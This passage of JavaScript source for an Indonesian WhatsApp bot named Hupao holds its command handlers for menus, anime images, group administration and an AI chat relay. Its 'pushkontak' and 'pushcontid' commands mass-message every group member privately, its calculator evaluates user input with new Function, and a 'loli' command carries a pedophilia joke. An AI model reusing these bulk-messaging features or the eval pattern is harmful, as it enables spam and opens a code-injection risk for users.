║ Discord : Boedzhanks#0001
╙╼━━━━━━━━━━━━━━━❆

${funmenu}
`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fooutgkzz, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kalimage,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
//=================================================
case 'gamemenu':
    if (groupMute) return 'error'
//if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
      if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
let fooutgdhsikzz = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `
╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║    『 Hupao by Boedzhanks 』
╙╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
    بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ

Hallo Kak ${pushname} 👋
Selamat ${ucapanWaktu} 😊

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║        Information
║ Bot Name : Hupao
║ Owner : ${ownername}
║ Daftar User : *${("id", db_user).length}*
║ Type Baileys : *Case*
║ Versi Bot : *1.0.0*
║ Nomor Bot : *wa.me/447389671237*
║ ${runtime(process.uptime())}
║ ${hariini}
║ ${time} WIB
╙╼━━━━━━━━━━━━━━━❆

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║       Social Media
║ Instagram : @boedzhanks.store
║ Facebook : Hardiansyah Ramadhani
║ Tiktok : @boedzhanks
║ Discord : Boedzhanks#0001
╙╼━━━━━━━━━━━━━━━❆

${gamemenu}
`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fooutgdhsikzz, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kalimage,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
        
//=================================================/
case "createqr": {
    if (groupMute) return 'error'
const qrcode = require('qrcode')
    if (!text) return errorReply(`Penggunaan Salah Harusnya ${prefix+command} bujank`)
const qyuer = await qrcode.toDataURL(text, { scale: 8 })
let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
hupao.sendMessage(from, { image: data, caption: `Sukses Kak` }, { quoted: kalgans })
}
break
case "detectqr": {
    if (groupMute) return 'error'
try {
mee = await hupao.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
const res = await fetch(`http://api.qrserver.com/v1/read-qr-code/?fileurl=${mem}`)
const data = await res.json() 
reply(util.format(data[0]))
} catch (err) {
reply(`Reply Image Yang Ada Qr Nya`)
}
}
break
        case 'pppanjang': case 'setppbot2':{
            if (groupMute) return 'error'
if (isBan) return errorReply('Lu di ban kocak awokwok') 
if (!isOwner) return errorReply('Fitur Khusus owner!')
if (!quoted) return errorReply(`Reply foto dgn caption ${prefix + command}`)
if (!/image/.test(mime)) return errorReply(`Reply foto dgn caption ${prefix + command}`)
if (/webp/.test(mime)) return errorReply(`Reply foto dgn caption ${prefix + command}`)
let media = await hupao.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await hupao.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
} 
]
})
reply("Done!!!")
}
break
   case 'ffstalk':{
if (groupMute) return 'error'
if (!q) return errorReply(`Example ${prefix+command} 946716486`)
reply('tunggu sebentar kaka')
eeh = await ffstalk.ffstalk(`${q}`)
reply(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break

case 'lirik':
case 'lyrics': {
    if (groupMute) return 'error'
    if(!q) return reply("Apa yang mau dicari?")
        let config = {
            method: 'get',
            maxBodyLength: Infinity,
            url: `https://weeb-api.vercel.app/genius?query=${q}`,
            headers: { }
          };
          
          async function lirik() {
            try {
              const response = await axios.request(config);
              link = response.data[0].url
              const res = await axios.request(
                {
                    method: 'get',
                    url: `https://weeb-api.vercel.app/lyrics?url=${link}`
                }
              )
              hupao.sendMessage(m.chat, {text: res.data}, {quoted: m})
            }
            catch (undefined) {
              reply("Lagu tidak ditemukan");
            }
          }
          
          lirik();
}
break

case 'pushcontid':{
    if (groupMute) return 'error'
if (!isOwner) return errorReply(mess.owner)
let idgc = text.split("|")[0]
let pesan = text.split("|")[1]
if (!idgc && !pesan) return reply(`Example: ${prefix + command} idgc|pesan`)
let metaDATA = await hupao.groupMetadata(idgc).catch((e) => reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
let count = getDATA.length;
let sentCount = 0;
reply(`*_Sedang Push ID..._*\n*_Mengirim pesan ke ${getDATA.length} orang, waktu selesai ${getDATA.length * 3} detik_*`)
for (let i = 0; i < getDATA.length; i++) {
setTimeout(function() {
hupao.sendMessage(getDATA[i], { text: pesan });
count--;
sentCount++;
if (count === 0) {
reply(`*_Semua pesan telah dikirim!:_* *_✓_*\n*_Jumlah pesan terkirim:_* *_${sentCount}_*`);
}
}, i * 3000);
}
}
break;

//=================================================//
case 'pushkontak':{
    if (groupMute) return 'error'
if (!isOwner) return errorReply(mess.owner)
if (!m.isGroup) return errorReply(`di group coy`)
if (!text) return errorReply(`Teks Nya Kak?`)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
reply(`*Mengirim pesan ke ${mem.length} orang, waktu selesai ${mem.length * 3} detik*`)
for (let geek of mem) {
await sleep(3000)
hupao.sendMessage(geek, {text: `${teksnye}`}, {quoted:m})
}
reply(`*Sukses mengirim pesan Ke ${mem.length} orang*`)
}
break
case  'myip':
            case 'ipbot':
                if (groupMute) return 'error'
                if (!isOwner) return errorReply(mess.owner)
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        reply("🔎 My public IP address is: " + ip);
                    })
                })
                break
                
                case 'getcase':
                    if (groupMute) return 'error'
if (!isOwner) return errorReply('lu olang pikir lu olang owner a?')
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("hupao.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
reply(`${getCase(q)}`)
break
//=================================================//
case 'public': {
    if (groupMute) return 'error'
if (!isOwner) return errorReply(mess.owner)
hupao.public = true
reply('Sukse Change To Public')
}
break
//=================================================//
case 'self': {
    if (groupMute) return 'error'
if (!isOwner) return errorReply(mess.owner)
hupao.public = false
reply('Sukses Change To Self')
}
break
//=================================================//

        case 'addprem':
if (!isOwner) return errorReply(mess.owner)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 6283129109022`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await hupao.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./base/dbnye/premium.json', JSON.stringify(prem))
reply(`The Number ${prrkek} Has Been Premium!`)
break
//=================================================//

 case 'delprem':
if (!isOwner) return errorReply(mess.owner)
if (!args[0]) return reply(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./base/dbnye/premium.json', JSON.stringify(prem))
reply(`The Number ${ya} Has Been Removed Premium!`)
break
//=================================================//

        case 'listpremium': case 'listprem':
teks = '*Premium List*\n\n'
for (let hupao of prem) {
teks += `- ${hupao}\n`
}
teks += `\n*Total : ${prem.length}*`
hupao.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: fkontak , contextInfo: { "mentionedJid": prem } })
break
//=================================================//
case 'pengguna':  {
if (!isOwner) return errorReply(mess.owner)
if (!args[0]) return reply(`*Contoh : ${command} add 6281214281312*`)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banned.includes(orgnye)
if (args[0] === "add") {
if (isBane) return reply('*Pengguna Ini telah Di Ban*')
banned.push(orgnye)
reply(`Succes ban Pengguna Ini`)
} else if (args[0] === "del") {
if (!isBane) return reply('*Pengguna Ini Telah Di hapus Dari Ban*')
let delbans = banned.indexOf(orgnye)
banned.splice(delbans, 1)
reply(`*Berhasil Menghapus Pengguna yang Di Ban*`)
} else {
reply("Error")
}
}
break

    case 'hd': case 'remini': {
            if (!isPrem) return errorReply(mess.prem)
			if (!quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
			await loading()
			const { remini } = require('./lib/remini.js')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			hupao.sendMessage(m.chat, { image: proses, caption: 'success'}, { quoted: m})
			}
			break
    
//=================================================//
    case 'listban':
if (isBan) return errorReply('*Lu Di Ban Owner*')
 teksooop = `*List Ban*\n\n`
for (let ii of banned) {
teksooop += `- ${ii}\n`
}
reply(teksooop)
break
        case 'autosticker':
            if (groupMute) return 'error'
if (!isOwner) return errorReply(mess.owner)
if (args[0] == 'on') {
if (autosticker) return reply('*Activated!*')
autosticker = true
reply('*Successfully Activated Autosticker*')
} else if (args[0] == 'off') {
if (!autosticker) return reply('*Not Yet Active!*')
autosticker = false
reply('*Successfully Turn off Autosticker*')
} else {
reply(`Type .autosticker on To Activate And .autosticker off To Deactivate`)
}
break
        case 'autostickergc':
            case 'autosticker':
                if (groupMute) return 'error'
if (!m.isGroup) return errorReply('khusus grup om')
if (!isBotAdmins) return errorReply('bot bukan atmin')
if (!isAdmins && !isOwner) return errorReply('atmin')
if (args.length < 1) return reply('type auto sticker on to enable\ntype auto sticker off to disable')
if (args[0]  === 'on'){
if (isAutoSticker) return reply(`Already activated`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
reply('autosticker activated')
} else if (args[0] === 'off'){
let anuticker1 = autosticker.indexOf(from)
autosticker.splice(anuticker1, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
reply('auto sticker deactivated')
}
break
//=================================================//
  /* case 'daftar':
                if (isRegistered) return errorReply ('Kamu sudah terdaftar')
                if (!q.includes('|')) return errorReply ('Format salah!')
                const namaUser = q.substring(0, q.indexOf('|') - 0)
                const umurUser = q.substring(q.lastIndexOf('|') + 1)
                const serialUser = createSerial(20)
                if(isNaN(umurUser)) return reply('Umur harus berupa angka!!')
                if (namaUser.length >= 30) return reply(`Namamu terlalu panjang`)
                if (umurUser > 50) return reply(`Dasar orang tua, ga bisa usia mu terlalu tua`)
                if (umurUser < 12) return reply(`Dasar bocil, ga bisa usia mu terlalu muda`)
				mzd = `Kamu telah terdaftar dengan informasi sebagai berikut:\n\n❏ Nama : ${namaUser}\n❏ Umur : ${umurUser}\n❏ Nomor : wa.me/${m.sender.split("@")[0]}\n❏ NS : ${serialUser}`
                veri = m.sender
                if (!m.isGroup) {
                    addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
                    hupao.sendMessage(m.chat, {image: thum, caption: mzd}, {quoted: fkontak})
                    
                } else {
                    addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
                    hupao.sendMessage(m.chat, {image: thum, caption: mzd}, {quoted: fkontak})
                    
                }
		break  */
case 'owner': case 'hupao':{
if (groupMute) return 'error'
 hupao.sendContact(from, global.owner, fkontak)
    
}
break
case 'wa': case 'whatsapp':{
    if (groupMute) return 'error'
await loading()
 hupao.sendContact(from, global.owner, m)
}
break
case 'ai': {
    if (groupMute) return 'error'
    if (!isPrem) return errorReply(mess.prem)
    if (!q) return reply('Example: Siapa Kamu?')
        let data = JSON.stringify({
            "external_id": "FRdKHnLG4JF6I14PexPWFvVyfrp-nZi6NFcoljmPPPM",
            "message": `${q}`
          });
          
          let config = {
            method: 'post',
            maxBodyLength: Infinity,
            url: 'https://api.apigratis.site/cai/send_message',
            headers: { 
              'Content-Type': 'application/json', 
              'accept': 'application/json'
            },
            data : data
          };
      
      axios.request(config)
      .then((response) => {
        dataAI = response.data;
        chat = dataAI.result.replies[0]
        hupao.sendMessage(m.chat, {text: `${chat.text}`}, {quoted: m})
      })
      .catch((error) => {
        console.log(error);
      });                 
}
break

case 'ai2': {
    if (groupMute) return 'error'
        let data = JSON.stringify({
            "external_id": "FRdKHnLG4JF6I14PexPWFvVyfrp-nZi6NFcoljmPPPM",
            "message": `${quoted.text}`
          });
          
          let config = {
            method: 'post',
            maxBodyLength: Infinity,
            url: 'https://api.apigratis.site/cai/send_message',
            headers: { 
              'Content-Type': 'application/json', 
              'accept': 'application/json'
            },
            data : data
          };
      
      axios.request(config)
      .then((response) => {
        dataAI = response.data;
        chat = dataAI.result.replies[0]
        hupao.sendMessage(m.chat, {text: `${chat.text}`}, {quoted: m})
      })
      .catch((error) => {
        console.log(error);
      });                 
}
break
case "bot": 
if (groupMute) return 'error'
 reply(`*Hi ${pushname}*

「 *BOT INFO* 」
❏ Nama Creator : *Boedzhanks*
❏ Nomor Creator : *wa.me/6283129109022*
❏ Group Official : *${ofc}*
❏ Nama Script : *Hupao*
❏ Daftar User : *${("id", db_user).length}*
❏ Versi Bot : *1.0.0*
❏ Botz Name : *Hupao*
❏ Nomor Bot : *wa.me/447389671237*
❏ Type Baileys : *Case*
❏ Source Code : *https://github.com/boedzhanks/Hupao*
❏ Uptime : ⏳ *${runtime(process.uptime())}*

▭▬▭▬▭▬▭▬▭▬▭▬▭▬
Powered By *${ownername}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`)

await hupao.sendMessage(m.chat, {audio: fs.readFileSync('./audio.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:ftroli})
break


//Anime Menu
case 'loli': {
    if (groupMute) return 'error'
    await loading()
    const response = await axios.get('https://weeb-api.vercel.app/loli', {
  responseType: 'arraybuffer'
});
  const imageBuffer = await Buffer.from(response.data, 'binary') // Get the image data as a buffer
  hupao.sendMessage(m.chat, {image:  imageBuffer, caption: `Peod Lu`}, {quoted: m})  
}
break

case 'character':
case 'chara':
case 'searchcharacter': {
    if (groupMute) return 'error'
    if(!q) return reply('Apa yang mau dicari?')
    await loading()
let config = {
  method: 'get',
  maxBodyLength: Infinity,
  url: `https://weeb-api.vercel.app/character?search=${q}`,
  headers: { }
};

async function character() {
  try {
    const response = await axios.request(config);
    result = response.data[0]
let text =`
❏ Nama : ${result.name.full}
❏ Japanese : ${result.name.native}
❏ Umur : ${result.age}
❏ Gender : ${result.gender}
❏ Tanggal Lahir : ${result.dateOfBirth}
${result.description}`
image = await getBuffer(result.imageUrl)
hupao.sendMessage(m.chat, {image: image, caption: text}, {quoted: m})
  }
  catch (undefined) {
    reply("Character Tidak Ditemukan");
  }
}

character();
}
break

case 'waifu': {
    if (groupMute) return 'error'
    await loading()
        const response = await axios.get('https://weeb-api.vercel.app/waifu', {
      responseType: 'arraybuffer'
    });
      const imageBuffer = await Buffer.from(response.data, 'binary') // Get the image data as a buffer
      hupao.sendMessage(m.chat, {image:  imageBuffer, caption: `Istrinya Gepeng`}, {quoted: m})    
    }
    break

    case 'waifu3':
        if (groupMute) return 'error'
        waifudd = await axios.get(`https://waifu.pics/api/sfw/waifu`) 
      var wbuttsss = [
         {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
         ]
       let button1Messages = {
        image: waifudd,
        caption:  `Here you go!`,
        footer: `${global.botname}`,
       buttons: wbuttsss,
       headerType: 2
       }       
                 await hupao.sendMessage(m.chat, button1Messages, { quoted:m }).catch(err => {
                         return('Error!')
                     })
     break

case 'wait': case 'tracemoe': {
    if (groupMute) return 'error'
    if (!quoted) return reply('Reply Image/Scene Anime')
    if (!/image/.test(mime)) m.reply('Reply Image/Scene Anime')
try {
    media = await hupao.downloadAndSaveMediaMessage(quoted)
    let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader.js')
    anu = await TelegraPh(media)
    linkGambar = (util.format(anu))
    await axios.get(`https://api.trace.moe/search?anilistInfo&url=${linkGambar}`)
        .then(response => {
            res = response.data.result[0]
            anilist = res.anilist
            waktu = timeWait(res.from)
            capt = `
「 What Anime Is This 」\n
${anilist.title.native}
❏ Japanese : ${anilist.title.romaji}
❏ English : ${anilist.title.english}
❏ Episode : ${res.episode}
❏ Time : ${waktu}
❏ Similarity : ${(res.similarity * 100).toFixed(1)}%
❏ Ecchi : ${anilist.isAdult}
❏ Anilist : https://anilist.co/anime/${anilist.id}
❏ MAL : https://myanimelist.net/anime/${anilist.idMal}`
        hupao.sendMessage(m.chat, {video: {url: res.video}, caption: capt}, {quoted: m})
  })
  .catch(error => {
    console.error('Error making the request:', error);
  });
} catch (error) {
   console.log(error)
}
}
break

case 'saucenao': {
if (groupMute) return 'error'
    if (!quoted) return reply(`Balas Image Dengan Caption ${prefix + command}`)
        if (!/image/.test(mime)) m.reply('Reply Image/Gambar Anime')
    try {
    let media = await hupao.downloadAndSaveMediaMessage(quoted)
    let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader.js')
    let anu = await TelegraPh(media)
    let img_url = (util.format(anu))
    await saucenaoapi(img_url)
    .then(async (result) => {
       result = result[0]
       data = result.raw.data
capt = `
「 Saucenao 」

❏ Url = ${result.url}
❏ Site = ${result.site}
❏ Similarity = ${result.similarity}%
❏ Creator = ${data.creator}
❏ Material = ${data.material}
❏ Characters = ${data.characters}`
    image = await getBuffer(result.thumbnail)
    hupao.sendMessage(m.chat, {image: image, caption: capt}, {quoted: m})
    })
} catch (error) {
    console.log(error)
}
}
break

case 'neko' :
    if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)
hupao.sendMessage(from, {image: {url:waifudd.data.url},caption:`Furry Lo`},{ quoted:m }).catch(err => {
 return('Error!')
})
break
case 'neko2': {
    if (groupMute) return 'error'
    await loading()
        const response = await axios.get('https://weeb-api.vercel.app/neko', {
      responseType: 'arraybuffer'
    });
      const imageBuffer = await Buffer.from(response.data, 'binary') // Get the image data as a buffer
      hupao.sendMessage(m.chat, {image:  imageBuffer, caption: `Furry Lo`}, {quoted: m})    
    }
    break

case 'waifu2' :
    if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
waifudd = await axios.get(`https://waifu.pics/api/sfw/waifu`) 
hupao.sendMessage(from, {image: {url:waifudd.data.url},caption:`Bojone Gepeng`}, { quoted:m }).catch(err => {
 return('Error!')
})
break

case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
hupao.sendVideoAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
break
//=================================================

       
case'menfes': case 'menfess': case 'confes': case 'confess' :{
                 if (groupMute) return 'error'
    hupao.menfess = hupao.menfess ? hupao.menfess : {}
    if (!text) throw `*Cara penggunaan :*\n\n${prefix + command} nomor|nama pengirim|pesan\n\n*Note:* nama pengirim boleh nama samaran atau anonymous.\n\n*Contoh:* ${prefix + command} ${m.sender.split`@`[0]}|Anonymous|Hai.`;
    let [jid, name, pesan] = text.split('|');
    if ((!jid || !name || !pesan)) throw `*Cara penggunaan :*\n\n${prefix + command} nomor|nama pengirim|pesan\n\n*Note:* nama pengirim boleh nama samaran atau anonymous.\n\n*Contoh:* ${prefix + command} ${m.sender.split`@`[0]}|Anonymous|Hai.`;
    jid = jid.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    let data = (await hupao.onWhatsApp(jid))[0] || {};
    if (!data.exists) throw 'Nomer tidak terdaftar di whatsapp.';
    if (jid == m.sender) throw 'tidak bisa mengirim pesan menfess ke diri sendiri.'
    let mf = Object.values(hupao.menfess).find(mf => mf.status === true)
    if (mf) return !0
    let id = + new Date
    let tek = `Hai @${data.jid.split('@')[0]}, kamu menerima pesan Menfess nih.\n\nDari: *${name}*\nPesan: \n${pesan}`.trim()
    await hupao.sendText(data.jid, tek, null)
    .then(() => {
    m.reply('Berhasil mengirim pesan menfess.')
    hupao.menfess[id] = {
    id,
    dari: m.sender,
    nama: name,
    penerima: data.jid,
    pesan: pesan,
    status: false
    }
    return !0
    })
    }
    break
        case "kalkulator":
            if (groupMute) return 'error'
 if (!text) return reply(`Lah Mana`)
let val = text
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
  let format = val
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
  try {
console.log(val)
let result = (new Function('return ' + val))()
if (!result) throw result
reply(`*${format}* = _${result}_`)
  } catch (e) {
if (e == undefined) throw 'Isinya?'
throw 'Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport'
  }
  break
         case 'ping': case 'botstatus': {
            if (groupMute) return 'error'
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

❏ Info Owner: ${ownername}
❏ Info Bot: Hupao
❏ Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
           ${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                reply(respon)
            }
            break
    case 'profil': case 'profile': {
                                    if (groupMute) return 'error'
                        let tao = db.data.users[sender]
         const owned = `${owner}@s.whatsapp.net`
const version = 2
const text12 = `*Hay selamat ${ucapanWaktu}*

▭▬▭▬▭▬▭▬▭▬▭▬▭▬
「 *Info User* 」
❏ Nama Pengguna  : *@${sender.split('@')[0]}*
❏ Premium : ${isPrem ? '✅' : '❎'}
❏ Limit : ${tao.limit}
❏ Status : Terdaftar di database ✅
▭▬▭▬▭▬▭▬▭▬▭▬▭

Terima Kasih sudah mendaftar ke dalam bot Hupao.

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

hupao.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: 'bodynya',
thumbnailUrl: 'https://www.isports.id/wp-content/uploads/2023/09/2aipAM72aBPS7Ny4L2MeNn-1024x576.jpg',
sourceUrl: "https://chat.whatsapp.com/Lhw9jBIZnBDF7wkEcwyZ1D",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted:m})
    }
break
                                                                           
//=================================================//
case 'linkgroup': case 'linkgc': {
    if (groupMute) return 'error'
if (!m.isGroup) return errorReply('Fitur Khusus Group')
if (!isBotAdmins) return errorReply('Bot Bukan Admin Cuy')
await loading()
let response = await hupao.groupInviteCode(from)
hupao.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//=================================================//
case 'resetlinkgc':
    if (groupMute) return 'error'
if (!isAdmins) return errorReply(mess.admin)

if (!m.isGroup) return errorReply('Fitur Khusus Group')
if (!isBotAdmins) return errorReply('Bot Bukan Admin Cuy')
await loading()
hupao.groupRevokeInvite(from)
break
//=================================================//
case 'sendlinkgc': {
    if (groupMute) return 'error'
if (!isPrem) return errorReply(mess.prem)

if (!m.isGroup) return reply('Fitur Khusus Group')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
    if (!isAdmins) return errorReply('lu emangnya atmin?')
await loading()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await hupao.groupInviteCode(from)
hupao.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })

}
break
//=================================================//
case 'kick': {
    if (groupMute) return 'error'
if (!m.isGroup) return reply('Fitur Khusus Group')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Fitur untuk admin')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await hupao.groupParticipantsUpdate(from, [users], 'remove')
}
break
//=================================================//
case 'add': {
if (groupMute) return 'error'
if (!m.isGroup) return reply('Fitur Khusus Group')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Fitur untuk admin')
await loading()
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await hupao.groupParticipantsUpdate(from, [users], 'add')
}
break
//=================================================//
case 'promote': {
if (groupMute) return 'error'
if (!m.isGroup) return reply('Fitur Khusus Group')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Fitur untuk admin')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await hupao.groupParticipantsUpdate(from, [users], 'promote')
}
break
//=================================================//
case 'demote': {
if (groupMute) return 'error'
if (!m.isGroup) return reply('Fitur Khusus Group')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Fitur untuk admin')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await hupao.groupParticipantsUpdate(from, [botNumber], 'demote')
}
break
//=================================================//
    case 'hidetag': case 'ht': {
        if (groupMute) return 'error'
if (!isAdmins) return reply(mess.admin)
if (!m.isGroup) return reply('Fitur Khusus Group')

hupao.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
}
break
//=================================================
case 'editgroup': {   
    if (groupMute) return 'error'

if (!m.isGroup) return m.reply('Fitur Khusus Group')
if (!isAdmins) return m.reply('Fitur untuk admin')

if (args[0] === 'close'){
await hupao.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await hupao.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
hupao.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Group Open
Group Close`}, {quoted:m}) 
 }
}
break
//=================================================//
case 'editinfo': {
if (groupMute) return 'error'
if (!m.isGroup) return reply('Fitur Khusus Group')
if (!isAdmins) return reply('Fitur untuk admin')
await loading()
 if (args[0] === 'open'){
await hupao.groupSettingUpdate(from, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await hupao.groupSettingUpdate(from, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else {
 hupao.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Editinfo Open
Editinfo Close`}, {quoted:m}) 

}
}
break
//=================================================//
case 'join': {
    if (groupMute) return 'error'
if (!isOwner) return reply(mess.owner)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'

let result = args[0].split('https://chat.whatsapp.com/')[1]
